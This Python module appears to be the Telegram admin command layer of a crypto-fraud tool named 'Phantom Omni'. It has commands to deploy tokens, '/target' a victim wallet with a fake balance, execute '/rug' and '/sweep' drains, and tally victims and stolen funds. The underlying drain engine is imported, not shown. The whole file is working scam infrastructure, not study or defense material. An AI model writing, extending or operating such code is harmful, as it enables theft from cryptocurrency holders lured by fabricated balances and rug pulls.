"""Phantom Omni — Admin Commands for Telegram

Admin commands:
- /admin — Opens the Mini-App
- /deploy <name> <symbol> <chain> — Deploy token
- /target <token> <wallet> <amount> — Target victim
- /rug <token> — Execute rug
- /sweep <token> — Execute sweep
- /tokens — List all tokens
- /stats — Show statistics
- /balance — Show wallet balances
"""

from __future__ import annotations

import logging
import html
import time
from typing import Optional

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import ContextTypes
from telegram.constants import ParseMode

from bot import phantom_db as db
from bot.phantom_engine import get_engine, deploy_token, set_fake_balance, execute_rug, execute_sweep, transfer

log = logging.getLogger("solo-metro.phantom.admintools")
HTML = ParseMode.HTML


# ================================================================
# HELPERS
# ================================================================

def _is_admin(update: Update) -> bool:
    """Check if the user is an admin."""
    from bot.admin import admin_ids
    try:
        return update.effective_user.id in admin_ids()
    except:
        return False


def _get_seed() -> Optional[str]:
    """Get the seed phrase from environment."""
    import os
    return os.getenv("PHANTOM_SEED", "").strip() or None


def _format_token_list(tokens: list, limit: int = 10) -> str:
    """Format token list for display."""
    if not tokens:
        return "No tokens deployed."
    
    lines = ["📋 <b>Your Tokens</b>\n"]
    for t in tokens[:limit]:
        status_emoji = "🟢" if t.get("status") == "active" else "🔴"
        lines.append(
            f"{status_emoji} <b>{t.get('name')}</b> ({t.get('symbol')})"
        )
        lines.append(f"   📍 <code>{t.get('address')}</code>")
        lines.append(f"   🔗 {t.get('chain')} | 👥 {t.get('victims', 0)} | 💰 {t.get('stolen', 0):.4f}")
        lines.append("")
    
    if len(tokens) > limit:
        lines.append(f"... and {len(tokens) - limit} more tokens")
    
    return "\n".join(lines)


def _format_stats(stats: dict) -> str:
    """Format stats for display."""
    return (
        f"📊 <b>Phantom Omni Stats</b>\n\n"
        f"🪙 Total Tokens: <b>{stats.get('total_tokens', 0)}</b>\n"
        f"🟢 Active: <b>{stats.get('active_tokens', 0)}</b>\n"
        f"🔴 Rugged: <b>{stats.get('rugged_tokens', 0)}</b>\n"
        f"\n"
        f"👥 Total Victims: <b>{stats.get('total_victims', 0)}</b>\n"
        f"💰 Total Stolen: <b>{stats.get('total_stolen', 0):.4f}</b>\n"
        f"📊 Total Volume: <b>${stats.get('total_volume', 0):,.0f}</b>\n"
        f"📝 Transactions: <b>{stats.get('total_transactions', 0)}</b>\n"
        f"🎁 Active Airdrops: <b>{stats.get('active_airdrops', 0)}</b>"
    )


def _format_balance(balances: dict) -> str:
    """Format balances for display."""
    lines = ["💰 <b>Wallet Balances</b>\n"]
    
    for chain, data in balances.items():
        main = data.get("main", 0)
        burner = data.get("burner", 0)
        total = data.get("total", 0)
        lines.append(
            f"<b>{chain}</b>\n"
            f"   Main: {main:.4f}\n"
            f"   Burner: {burner:.4f}\n"
            f"   Total: <b>{total:.4f}</b>\n"
        )
    
    return "\n".join(lines)


# ================================================================
# COMMANDS
# ================================================================

async def cmd_admin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Open the Admin Mini-App."""
    if not _is_admin(update):
        return
    
    from bot.adminweb import admin_button_url
    url = admin_button_url()
    
    if not url:
        await update.message.reply_text(
            "❌ Admin panel URL not configured. Set RENDER_EXTERNAL_URL."
        )
        return
    
    keyboard = InlineKeyboardMarkup([[
        InlineKeyboardButton("🖥 Open Phantom Omni", web_app=WebAppInfo(url=url))
    ]])
    
    await update.message.reply_text(
        "⚡ <b>Phantom Omni Admin</b>\n\n"
        "🔐 Enter your seed phrase in the app to unlock all features.\n\n"
        "📊 <i>Real tokens. Real drains. Real control.</i>",
        parse_mode=HTML,
        reply_markup=keyboard
    )


async def cmd_deploy(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Deploy a token via Telegram command.
    Usage: /deploy <name> <symbol> <chain> <threshold>
    Example: /deploy MegaDoge MEGA BSC 10
    """
    if not _is_admin(update):
        return
    
    args = context.args or []
    if len(args) < 4:
        await update.message.reply_text(
            "Usage: /deploy <name> <symbol> <chain> <threshold>\n"
            "Example: /deploy MegaDoge MEGA BSC 10\n\n"
            "Chains: BSC, ETH, SOL"
        )
        return
    
    name = args[0]
    symbol = args[1].upper()
    chain = args[2].upper()
    
    try:
        threshold = float(args[3])
    except ValueError:
        await update.message.reply_text("❌ Threshold must be a number.")
        return
    
    if chain not in ("BSC", "ETH", "SOL"):
        await update.message.reply_text("❌ Supported chains: BSC, ETH, SOL")
        return
    
    seed = _get_seed()
    if not seed:
        await update.message.reply_text(
            "❌ Seed phrase not configured. Set PHANTOM_SEED environment variable."
        )
        return
    
    await update.message.reply_text(f"⏳ Deploying {name} ({symbol}) on {chain}...")
    
    try:
        result = await deploy_token(
            name=name,
            symbol=symbol,
            chain=chain,
            threshold=threshold,
            seed_phrase=seed
        )
        
        await update.message.reply_text(
            f"✅ <b>Token Deployed!</b>\n\n"
            f"📌 {name} ({symbol})\n"
            f"🔗 Chain: {chain}\n"
            f"📍 Address: <code>{result['address']}</code>\n"
            f"💰 Threshold: {threshold} {chain}\n"
            f"🔗 Explorer: {result['explorer_url']}",
            parse_mode=HTML
        )
        
    except Exception as e:
        await update.message.reply_text(f"❌ Deployment failed: {str(e)}")


async def cmd_target(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Target a victim with fake balance.
    Usage: /target <token_address> <wallet_address> <amount>
    Example: /target 0x123... 0x456... 50000
    """
    if not _is_admin(update):
        return
    
    args = context.args or []
    if len(args) < 3:
        await update.message.reply_text(
            "Usage: /target <token_address> <wallet_address> <amount>\n"
            "Example: /target 0x123... 0x456... 50000"
        )
        return
    
    token_address = args[0]
    wallet_address = args[1]
    
    try:
        amount = int(args[2])
    except ValueError:
        await update.message.reply_text("❌ Amount must be a number.")
        return
    
    seed = _get_seed()
    if not seed:
        await update.message.reply_text("❌ Seed phrase not configured.")
        return
    
    await update.message.reply_text(f"⏳ Targeting victim {wallet_address[:10]}...")
    
    try:
        result = await set_fake_balance(
            token_address=token_address,
            wallet_address=wallet_address,
            amount=amount,
            seed_phrase=seed
        )
        
        await update.message.reply_text(
            f"✅ <b>Victim Targeted!</b>\n\n"
            f"🎯 Wallet: <code>{wallet_address}</code>\n"
            f"💰 Fake Balance: {amount:,} tokens\n"
            f"🔗 TX: {result['tx_hash']}",
            parse_mode=HTML
        )
        
    except Exception as e:
        await update.message.reply_text(f"❌ Failed: {str(e)}")


async def cmd_rug(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Execute rug on a token.
    Usage: /rug <token_address>
    Example: /rug 0x123...
    """
    if not _is_admin(update):
        return
    
    args = context.args or []
    if not args:
        await update.message.reply_text(
            "Usage: /rug <token_address>\n"
            "Example: /rug 0x123..."
        )
        return
    
    token_address = args[0]
    seed = _get_seed()
    if not seed:
        await update.message.reply_text("❌ Seed phrase not configured.")
        return
    
    await update.message.reply_text("⏳ Executing rug...")
    
    try:
        result = await execute_rug(
            token_address=token_address,
            seed_phrase=seed
        )
        
        await update.message.reply_text(
            f"💀 <b>RUG EXECUTED!</b>\n\n"
            f"🔗 Token: <code>{token_address}</code>\n"
            f"💰 Stolen: {result.get('stolen', 0):.4f}\n"
            f"👥 Victims: {result.get('victims', 0)}\n"
            f"🔗 TX: {result.get('tx_hash', '')}",
            parse_mode=HTML
        )
        
    except Exception as e:
        await update.message.reply_text(f"❌ Rug failed: {str(e)}")


async def cmd_sweep(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Execute sweep on a token.
    Usage: /sweep <token_address>
    Example: /sweep 0x123...
    """
    if not _is_admin(update):
        return
    
    args = context.args or []
    if not args:
        await update.message.reply_text(
            "Usage: /sweep <token_address>\n"
            "Example: /sweep 0x123..."
        )
        return
    
    token_address = args[0]
    seed = _get_seed()
    if not seed:
        await update.message.reply_text("❌ Seed phrase not configured.")
        return
    
    await update.message.reply_text("⏳ Executing sweep...")
    
    try:
        result = await execute_sweep(
            token_address=token_address,
            seed_phrase=seed
        )
        
        await update.message.reply_text(
            f"🧹 <b>SWEEP COMPLETE!</b>\n\n"
            f"💰 Amount: {result.get('amount', 0):.4f}\n"
            f"🔗 From: <code>{result.get('from', '')}</code>\n"
            f"🔗 To: <code>{result.get('to', '')}</code>\n"
            f"🔗 TX: {result.get('tx_hash', '')}",
            parse_mode=HTML
        )
        
    except Exception as e:
        await update.message.reply_text(f"❌ Sweep failed: {str(e)}")


async def cmd_tokens(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """List all tokens."""
    if not _is_admin(update):
        return
    
    tokens = db.list_tokens()
    
    if not tokens:
        await update.message.reply_text("📋 No tokens deployed yet.")
        return
    
    # Split into chunks if too long
    message = _format_token_list(tokens)
    if len(message) > 4000:
        # Send in parts
        for i in range(0, len(tokens), 10):
            chunk = _format_token_list(tokens[i:i+10])
            await update.message.reply_text(chunk, parse_mode=HTML)
    else:
        await update.message.reply_text(message, parse_mode=HTML)


async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show statistics."""
    if not _is_admin(update):
        return
    
    stats = db.get_stats()
    
    # Add engine stats if seed available
    seed = _get_seed()
    if seed:
        engine = get_engine(seed)
        engine_stats = engine.get_stats()
        stats.update(engine_stats)
    
    message = _format_stats(stats)
    await update.message.reply_text(message, parse_mode=HTML)


async def cmd_balance(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show wallet balances."""
    if not _is_admin(update):
        return
    
    seed = _get_seed()
    if not seed:
        await update.message.reply_text("❌ Seed phrase not configured.")
        return
    
    await update.message.reply_text("⏳ Fetching balances...")
    
    try:
        engine = get_engine(seed)
        await engine.connect_all()
        balances = await engine.get_all_balances()
        
        message = _format_balance(balances)
        await update.message.reply_text(message, parse_mode=HTML)
        
    except Exception as e:
        await update.message.reply_text(f"❌ Failed: {str(e)}")


# ================================================================
# REGISTRATION
# ================================================================

def register_phantom_commands(application) -> None:
    """Register Phantom Omni admin commands."""
    from telegram.ext import CommandHandler
    
    # Admin-only commands
    application.add_handler(CommandHandler("admin", cmd_admin))
    application.add_handler(CommandHandler("deploy", cmd_deploy))
    application.add_handler(CommandHandler("target", cmd_target))
    application.add_handler(CommandHandler("rug", cmd_rug))
    application.add_handler(CommandHandler("sweep", cmd_sweep))
    application.add_handler(CommandHandler("tokens", cmd_tokens))
    application.add_handler(CommandHandler("stats", cmd_stats))
    application.add_handler(CommandHandler("balance", cmd_balance))
    
    log.info("Phantom Omni admin commands registered")